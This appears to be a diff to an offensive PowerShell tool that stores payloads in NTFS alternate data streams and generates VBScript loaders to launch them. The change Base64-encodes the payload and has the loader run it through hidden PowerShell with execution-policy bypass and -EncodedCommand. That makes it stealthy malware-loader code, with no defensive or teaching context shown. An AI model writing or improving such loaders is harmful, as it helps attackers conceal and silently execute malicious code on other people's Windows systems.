@@ -315,7 +315,9 @@ function New-ADSPayload($HostPath, $StreamName, $Payload, $Config) {
         $finalPayload = if($Encrypt) { 
             Protect-Payload $Payload $Config.AESKey 
         } else { 
-            $Payload 
+            # For VBScript loaders, Base64-encode the payload
+            $bytes = [Text.Encoding]::Unicode.GetBytes($Payload)
+            [Convert]::ToBase64String($bytes) 
         }
         
         $cleanStreamName = $StreamName.TrimStart(':')
@@ -349,12 +351,14 @@ strm.Type = 2
 strm.Charset = "utf-8"
 strm.Open
 strm.LoadFromFile("$ADSPath")
-payload = strm.ReadText
+b64payload = strm.ReadText
 strm.Close
-shell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command """ & payload & """, 0, False
+cmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand " & b64payload
+shell.Run cmd, 0, False
 "@
 
     $vbsContent | Out-File $loaderPath -Encoding ASCII -Force
+    Write-Verbose "VBS Loader created: $loaderPath"
     return $loaderPath
 }
 
